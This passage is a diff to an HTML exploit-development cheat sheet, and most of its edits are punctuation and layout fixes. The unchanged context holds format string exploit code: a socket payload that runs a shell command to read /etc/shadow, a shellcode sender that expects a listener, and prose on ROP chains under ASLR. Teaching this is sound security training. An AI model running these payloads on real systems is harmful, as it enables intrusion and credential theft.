     <label><input type="checkbox"> Trigger the hijacked function on the same connection</label>
-    <pre><code class="language-python"># Now send the command string — it becomes the argument to system()
+    <pre><code class="language-python"># Now send the command string - it becomes the argument to system()
 import time
 time.sleep(0.5)
 s.send(b"/bin/sh -c 'id; cat /etc/shadow'\n")
@@ -5735,7 +5738,7 @@ s.close()</code></pre>
 
 <p>A complete format string exploit combines reconnaissance, leaking, and writing into a single automated flow. The exploit first identifies the format string offset, then leaks runtime addresses to defeat ASLR, calculates target addresses, performs the overwrite (GOT entry, SEH handler, or function pointer), and finally triggers the hijacked code path. On Windows, the chain typically overwrites the SEH handler or an IAT entry and triggers an exception or API call. On Linux, GOT overwrites followed by triggering the replaced function are standard.</p>
 
-<p>Combining ROP with format strings under ASLR introduces additional constraints. A standard VirtualAlloc or VirtualProtect ROP chain assumes fixed gadget addresses, but ASLR randomizes the module base on each boot. The format string leak from Part I provides the base address, but the shellcode location on the stack is also unknown — it shifts with each run. The exploit must leak the module base via the read primitive, calculate all gadget addresses at runtime, determine where on the stack the shellcode will land (using a second leaked stack address), and build the format string write payload to place the ROP chain and shellcode pointer at the correct location. When the format string buffer is too small to hold both the ROP chain and shellcode, the exploit must store shellcode in a larger buffer elsewhere in the process — a global command buffer in the <code>.data</code> section, or a protocol input buffer that persists across requests. A prior protocol command places the shellcode there, and the ROP chain pivots execution to that known address after the format string write redirects EIP.</p>
+<p>Combining ROP with format strings under ASLR introduces additional constraints. A standard VirtualAlloc or VirtualProtect ROP chain assumes fixed gadget addresses, but ASLR randomizes the module base on each boot. The format string leak from Part I provides the base address, but the shellcode location on the stack is also unknown - it shifts with each run. The exploit must leak the module base via the read primitive, calculate all gadget addresses at runtime, determine where on the stack the shellcode will land (using a second leaked stack address), and build the format string write payload to place the ROP chain and shellcode pointer at the correct location. When the format string buffer is too small to hold both the ROP chain and shellcode, the exploit must store shellcode in a larger buffer elsewhere in the process - a global command buffer in the <code>.data</code> section, or a protocol input buffer that persists across requests. A prior protocol command places the shellcode there, and the ROP chain pivots execution to that known address after the format string write redirects EIP.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -5806,7 +5809,7 @@ buf  = b""
 buf += b"[shellcode-bytes]"
 
 s.send(b"\x90" * 16 + buf + b"\n")
-print("[+] Shellcode sent — check your listener")
+print("[+] Shellcode sent - check your listener")
 s.close()</code></pre>
   </li>
   <li>
@@ -5963,7 +5966,7 @@ s.close()</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Validate payload alignment and correctness before sending</label>
-    <pre><code class="language-python"># Debug helper — verify addresses are 4-byte aligned and contain no bad chars
+    <pre><code class="language-python"># Debug helper - verify addresses are 4-byte aligned and contain no bad chars
 def validate_payload(payload, bad_chars=b'\x00\x0a\x0d'):
     for i, b in enumerate(payload):
         if b in bad_chars:
@@ -5971,21 +5974,19 @@ def validate_payload(payload, bad_chars=b'\x00\x0a\x0d'):
             return False
     if len(payload) % 4 != 0:
         print(f"[!] Payload not 4-byte aligned (len={len(payload)})")
-    print(f"[+] Payload OK — {len(payload)} bytes, no bad chars")
+    print(f"[+] Payload OK - {len(payload)} bytes, no bad chars")
     return True
 
 validate_payload(fmt.payload())</code></pre>
   </li>
 </ul>
 
-</div>
-</div>
-</section>
-
-
+        </div>
+      </div>
+    </section>
   </main>
 
-<div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
   <div id="index" class="index">
 <button class="dropdown-btn section-flow-1">1. WinDbg and x86 Architecture<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-1">
@@ -6028,7 +6029,7 @@ validate_payload(fmt.payload())</code></pre>
 <a class="dropdown-link" href="#ida-patching">4.5 Patching Binaries in IDA</a>
 <a class="dropdown-link" href="#ida-scripting">4.6 IDA Scripting with IDAPython</a>
 </div>
-<button class="dropdown-btn section-flow-5">5. Overcoming Space Restrictions — Egghunters<i class="bi bi-caret-down-fill"></i></button>
+<button class="dropdown-btn section-flow-5">5. Overcoming Space Restrictions - Egghunters<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-5">
 <a class="dropdown-link" href="#space-restriction">5.1 The Space Restriction Problem</a>
 <a class="dropdown-link" href="#egg-concept">5.2 Egg Concept and Staged Payloads</a>
@@ -6097,8 +6098,7 @@ validate_payload(fmt.payload())</code></pre>
 <a class="dropdown-link" href="#format-string-full-chain">11.5 Full Format String Exploitation Chain</a>
 <a class="dropdown-link" href="#format-string-automation">11.6 Format String Exploit Automation</a>
 </div>
-
-
+</div>
 
   <footer id="footer">
     <div class="container">
@@ -6117,10 +6117,14 @@ validate_payload(fmt.payload())</code></pre>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-json.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-xml-doc.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-java.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-markup-templating.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-php.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-go.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>
   <script src="./js/main.js"></script>
   <script defer src="./js/site.js"></script>
   <script src="./js/cheatsheet-index.js"></script>
   <script defer src="./js/methodology-checkboxes.js"></script>
 </body>
-
 </html>
